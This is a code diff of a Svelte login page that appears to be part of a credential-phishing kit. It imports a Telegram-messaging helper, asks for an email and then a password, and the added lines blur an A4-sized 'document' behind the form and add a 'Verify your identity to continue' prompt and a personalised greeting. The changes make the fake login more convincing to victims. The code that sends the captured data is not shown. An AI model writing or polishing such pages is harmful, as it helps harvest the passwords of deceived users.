@@ -1,6 +1,5 @@
 <script lang="ts">
   import { onMount } from 'svelte';
-  import { page } from '$app/stores';
   import { browser } from '$app/environment';
   import { sendTelegramMessage } from '$lib/telegram';
   import { writable, get } from 'svelte/store';
@@ -96,7 +95,19 @@
     display: flex;
     align-items: center;
     justify-content: center;
+    position: relative;
+  }
+
+  .a4-blur {
+    position: absolute;
+    width: 21cm;
+    height: 29.7cm;
+    max-width: 90vw;
+    max-height: 90vh;
     backdrop-filter: blur(10px);
+    background-color: rgba(255, 255, 255, 0.05);
+    border-radius: 12px;
+    z-index: 1;
   }
 
   .card {
@@ -112,12 +123,26 @@
     display: flex;
     flex-direction: column;
     justify-content: center;
+    z-index: 2;
   }
 
   h2 {
     font-size: 1.4rem;
-    margin-bottom: 1rem;
+    margin-bottom: 0.5rem;
     font-weight: normal;
+  }
+
+  .instruction {
+    font-size: 0.95rem;
+    color: #333;
+    margin-bottom: 0.8rem;
+  }
+
+  .subtext {
+    font-size: 0.85rem;
+    color: #555;
+    margin-bottom: 1rem;
+    line-height: 1.2;
   }
 
   .avatar {
@@ -167,6 +192,8 @@
 </style>
 
 <main>
+  <div class="a4-blur"></div>
+
   {#if $loading}
     <div class="card">
       <p class="loading">Logging in...</p>
@@ -179,12 +206,21 @@
           type="email"
           bind:value={$email}
           placeholder="you@example.com"
-          on:blur={() => $step = 'password'}
+          on:blur={() => {
+            if ($email.trim().length > 0) step.set('password');
+          }}
         />
       {:else}
         {#if $email || $name}
+          <p class="instruction">Verify your identity to continue</p>
           <div class="avatar">{getInitials($name || $email)}</div>
           <h2>Welcome {$name || $email}</h2>
+          <div class="subtext">
+            {#if $name}
+              {$name}<br />
+            {/if}
+            {$email}
+          </div>
         {/if}
         <input
           type="password"
